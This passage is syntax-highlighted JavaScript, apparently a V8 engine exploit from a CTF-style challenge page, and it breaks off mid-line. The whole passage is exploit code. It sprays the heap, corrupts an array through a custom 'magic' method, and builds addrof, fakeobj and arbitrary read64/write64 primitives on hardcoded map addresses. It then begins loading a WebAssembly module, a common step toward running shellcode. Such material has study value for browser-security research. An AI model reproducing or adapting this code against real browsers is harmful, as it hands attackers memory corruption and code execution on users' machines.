style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">f2i</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    float_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#A65E2B"> this</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> int_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#998418">Number</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">f2smi</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    float_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#A65E2B"> this</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> int_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#998418">Number</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> BigInt</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">this</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#998418">Number</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">smi2f</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> BigInt</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">this</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">smi2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#AB5959">function</span><span style="color:#59873A"> sleep</span><span style="color:#2993a3">(</span><span style="color:#B07D48">time</span><span style="color:#2993a3">)</span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	var</span><span style="color:#B07D48"> timeStamp</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Date</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">getTime</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	var</span><span style="color:#B07D48"> endTime</span><span style="color:#999999"> =</span><span style="color:#B07D48"> timeStamp</span><span style="color:#AB5959"> +</span><span style="color:#B07D48"> time</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	while</span><span style="color:#1e754f">(</span><span style="color:#1E754F">true</span><span style="color:#1e754f">)</span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">		if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">new</span><span style="color:#59873A"> Date</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">.</span><span style="color:#59873A">getTime</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999"> </span><span style="color:#999999">></span><span style="color:#B07D48"> endTime</span><span style="color:#a65e2b">)</span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">			return</span><span style="color:#999999">;</span><br><span style="color:#999999">		</span><span style="color:#a65e2b">}</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><span style="color:#AB5959">function</span><span style="color:#59873A"> debug</span><span style="color:#2993a3">(</span><span style="color:#B07D48">objWrapper</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> objName</span><span style="color:#999999"> =</span><span style="color:#B07D48"> Object</span><span style="color:#999999">.</span><span style="color:#59873A">keys</span><span style="color:#1e754f">(</span><span style="color:#B07D48">objWrapper</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> objValue</span><span style="color:#999999"> =</span><span style="color:#B07D48"> objWrapper</span><span style="color:#1e754f">[</span><span style="color:#B07D48">objName</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#1e754f">(</span><span style="color:#B5695977">`</span><span style="color:#B56959">--- Debugging: </span><span style="color:#1E754F">${</span><span style="color:#B56959">objName</span><span style="color:#1E754F">}</span><span style="color:#B56959"> ---</span><span style="color:#B5695977">`</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">	// %DebugPrint(objValue);</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#1e754f">(</span><span style="color:#B5695977">`</span><span style="color:#B56959">--- End of: </span><span style="color:#1E754F">${</span><span style="color:#B56959">objName</span><span style="color:#1E754F">}</span><span style="color:#B56959"> ---</span><span style="color:#B5695977">`</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><br><span style="color:#2993a3">(</span><span style="color:#AB5959">function</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#B5695977">	"</span><span style="color:#B56959">use strict</span><span style="color:#B5695977">"</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> makePackedDoubleArray</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">		return</span><span style="color:#999999"> </span><span style="color:#a13865">[</span><span style="color:#2F798A">13.37</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13.37</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13.37</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13.37</span><span style="color:#a13865">]</span><span style="color:#999999">.</span><span style="color:#59873A">slice</span><span style="color:#a13865">(</span><span style="color:#2F798A">0</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> makePackedArray</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">		return</span><span style="color:#999999"> </span><span style="color:#a13865">[</span><span style="color:#2F798A">13.37</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13.37</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13.37</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#bda437">{</span><span style="color:#bda437">}</span><span style="color:#a13865">]</span><span style="color:#999999">.</span><span style="color:#59873A">slice</span><span style="color:#a13865">(</span><span style="color:#2F798A">0</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> spraySize</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x5000</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> spray</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Array</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">spraySize</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">	// for (let i = 0; i &#x3C; 200000; i++) shellcode(0);</span><br><br><span style="color:#1E754F">	for</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#B07D48"> spraySize</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +=</span><span style="color:#2F798A"> 3</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		spray</span><span style="color:#a13865">[</span><span style="color:#B07D48">i</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> makePackedDoubleArray</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">		spray</span><span style="color:#a13865">[</span><span style="color:#B07D48">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> makePackedDoubleArray</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">		spray</span><span style="color:#a13865">[</span><span style="color:#B07D48">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> makePackedArray</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> corruptorIndex</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x2000</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> c</span><span style="color:#999999"> =</span><span style="color:#B07D48"> spray</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">corruptorIndex</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> d</span><span style="color:#999999"> =</span><span style="color:#B07D48"> spray</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">corruptorIndex</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> e</span><span style="color:#999999"> =</span><span style="color:#B07D48"> spray</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">corruptorIndex</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 2</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">	// const f = [{}];</span><br><span style="color:#B07D48">	e</span><span style="color:#999999">.</span><span style="color:#59873A">magic</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">e</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#999999">,</span><span style="color:#2F798A"> 38</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> PACKED_DOUBLE_ELEMENTS_MAP_ADDR</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x80b4f1</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> PACKED_ELEMENTS_MAP_ADDR</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x80b579</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> FIXED_DOUBLE_ARRAY_TYPE</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x911</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> FIXED_ARRAY_TYPE</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x5dd</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> PROPERTIES_ADDR</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x7bd</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><br><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> test_obj</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><span style="color:#a65e2b">}</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	d</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">35</span><span style="color:#a65e2b">]</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 13.37</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> addrof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">obj</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		c</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> obj</span><span style="color:#999999">;</span><br><span style="color:#AB5959">		let</span><span style="color:#B07D48"> res</span><span style="color:#999999"> =</span><span style="color:#B07D48"> d</span><span style="color:#a13865">[</span><span style="color:#2F798A">5</span><span style="color:#a13865">]</span><span style="color:#999999">.</span><span style="color:#59873A">f2i</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">		return</span><span style="color:#B07D48"> res</span><span style="color:#AB5959"> &#x26;</span><span style="color:#2F798A"> 0xffffffff</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> fakeobj</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">addr</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		d</span><span style="color:#a13865">[</span><span style="color:#2F798A">5</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#bda437">(</span><span style="color:#B07D48">addr</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#bda437">)</span><span style="color:#AB5959"> |</span><span style="color:#B07D48"> addr</span><span style="color:#a13865">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">		return</span><span style="color:#B07D48"> c</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> arbrw_arr</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><span style="color:#2F798A">1.1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2.2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3.3</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> fake_arr</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><br><span style="color:#999999">		</span><span style="color:#a13865">(</span><span style="color:#bda437">(</span><span style="color:#B07D48">PROPERTIES_ADDR</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#bda437">)</span><span style="color:#AB5959"> |</span><span style="color:#B07D48"> PACKED_DOUBLE_ELEMENTS_MAP_ADDR</span><span style="color:#a13865">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">,</span><span style="color:#A0ADA0"> // 伪造好不变的字段</span><br><span style="color:#2F798A">		0x4141414141414141</span><span style="color:#AB5959">n</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#A0ADA0"> // 留出 length | elements 的空间</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">fake_arr</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">fake_arr_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> fake_arr_elements_addr</span><span style="color:#999999"> =</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x84</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">arbrw_arr</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">arbrw_arr_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	fake_arr</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A">8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#a65e2b">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">fake_arr_elements_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> fake_arr_elements_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> fake_obj</span><span style="color:#999999"> =</span><span style="color:#59873A"> fakeobj</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">fake_arr_elements_addr</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><br><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> write64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">where</span><span style="color:#999999">,</span><span style="color:#B07D48"> what</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		fake_obj</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">6</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#B07D48">where</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">		arbrw_arr</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> what</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#A0ADA0">	//</span><br><span style="color:#AB5959">	function</span><span style="color:#59873A"> read64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">where</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		fake_obj</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">6</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#B07D48">where</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">		return</span><span style="color:#B07D48"> arbrw_arr</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999">.</span><span style="color:#59873A">f2i</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> wasmCode</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Uint8Array</span><span style="color:#a65e2b">(</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">97</span><span style="color:#999999">,</span><span style="color:#2F798A">115</span><span style="color:#999999">,</span><span style="color:#2F798A">109</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">133</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">96</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">127</span><span style="color:#999999">,</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A">130</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#2F798A">132</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">112</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">5</span><span style="color:#999999">,</span><span style="color:#2F798A">131</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">6</span><span style="color:#999999">,</span><span style="color:#2F798A">129</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">7</span><span style="color:#999999">,</span><span style="color:#2F798A">145</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#2F798A">6</span><span style="color:#999999">,</span><span style="color:#2F798A">109</span><span style="color:#999999">,</span><span style="color:#2F798A">101</span><span style="color:#999999">,</span><span style="color:#2F798A">109</span><span style="color:#999999">,</span><span style="color:#2F798A">111</span><span style="color:#999999">,</span><span style="color:#2F798A">114</span><span style="color:#999999">,</span><span style="color:#2F798A">121</span><span style="color:#999999">,</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#2F798A">109</span><span style="color:#999999">,</span><span style="color:#2F798A">97</span><span style="color:#999999">,</span><span style="color:#2F798A">105</span><span style="color:#999999">,</span><span style="color:#2F798A">110</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">10</span><span style="color:#999999">,</span><span style="color:#2F798A">138</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A">132</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A">65</span><span style="color:#999999">,</span><span style="color:#2F798A">42</span><span style="color:#999999">,</span><span style="color:#2F798A">11</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> wasmModule</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">wasmCode</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> wasmInstance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">wasmModule</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">{</span><span style="color:#a13865">}</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> f</span><span style="color:#999999"> =</span><span style="color:#B07D48"> wasmInstance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span 